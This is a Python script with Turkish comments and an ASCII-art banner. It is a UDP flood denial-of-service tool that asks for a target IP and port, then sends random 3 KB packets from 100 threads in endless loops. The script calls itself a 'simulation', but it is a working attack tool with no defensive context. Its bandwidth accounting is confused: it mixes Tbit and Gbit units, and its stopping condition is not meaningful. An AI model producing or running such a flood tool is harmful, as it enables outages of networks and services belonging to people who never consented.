import socket
import random
import threading
import time
import sys

# ASCII Sanatı
ascii_art = r"""
  ____              _            _       __       __           
 ▄▀▀▄ ▄▀▄  ▄▀▀█▀▄    ▄▀▀▄ ▄▀▄  ▄▀▀█▄▄   ▄▀▀▀▀▄   ▄▀▀▀▀▄ 
█  █ ▀  █ █   █  █  █  █ ▀  █ █ ▄▀   █ █      █ █ █   ▐ 
▐  █    █ ▐   █  ▐  ▐  █    █ ▐ █    █ █      █    ▀▄   
  █    █      █       █    █    █    █ ▀▄    ▄▀ ▀▄   █  
▄▀   ▄▀    ▄▀▀▀▀▀▄  ▄▀   ▄▀    ▄▀▄▄▄▄▀   ▀▀▀▀    █▀▀▀   
█    █    █       █ █    █    █     ▐            ▐      
▐    ▐    ▐       ▐ ▐    ▐    ▐                         
 
"""

# Renk Tanımları
class Renkler:
    YESIL = "\033[92m"
    KIRMIZI = "\033[91m"
    SARı = "\033[93m"
    RESET = "\033[0m"

# Hedef IP ve Port kullanıcıdan alınır
hedef_ip = input(f"{Renkler.SARı}Hedef IP adresini girin: {Renkler.RESET}")
hedef_port = int(input(f"{Renkler.SARı}Hedef Port numarasını girin: {Renkler.RESET}"))

# Hedef Bant Genişliği
hedef_bant_genisligi = 10000000000  # 10 Gbit/s (10000 Mbit/s) hedef

# Paket boyutunu belirleyin
paket_boyutu = 3072  # Paket boyutu (byte)

# UDP Paket Gönderme Fonksiyonu
def udp_paket_gonder():
    soket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP soketi oluşturuluyor
    veri_gonderilecek = random._urandom(paket_boyutu)  # Rastgele veri oluşturuluyor

    while True:
        soket.sendto(veri_gonderilecek, (hedef_ip, hedef_port))  # UDP paketini hedefe gönder
        print(f"{Renkler.YESIL}Paket gönderildi: {hedef_ip}:{hedef_port}{Renkler.RESET}", end='\r')

# Bant genişliğini ayarlamak için trafiği hızlandırmak
def selam_ver(num_thread):
    threadler = []
    toplam_gonderilen = 0

    for _ in range(num_thread):
        thread = threading.Thread(target=udp_paket_gonder)
        threadler.append(thread)
        thread.start()

    # Hedeflenen bant genişliğine ulaşılana kadar devam et
    while toplam_gonderilen < hedef_bant_genisligi:
        time.sleep(1)  # 1 saniye bekle
        toplam_gonderilen += num_thread * paket_boyutu * 8 / 1e9  # Tbit/sn cinsinden veri miktarını hesapla
        print(f"{Renkler.SARı}Toplam Gönderilen: {toplam_gonderilen:.2f} Tbit{Renkler.RESET}", end='\r')

    # Tüm thread'lerin bitmesini bekle
    for thread in threadler:
        thread.join()

if __name__ == "__main__":
    print(ascii_art)  # ASCII sanatını göster
    num_thread = 100  # Paralel thread sayısını ayarlayın
    print(f"{Renkler.KIRMIZI}UDP flood simülasyonu {num_thread} thread ile başlatılıyor...{Renkler.RESET}")
    selam_ver(num_thread)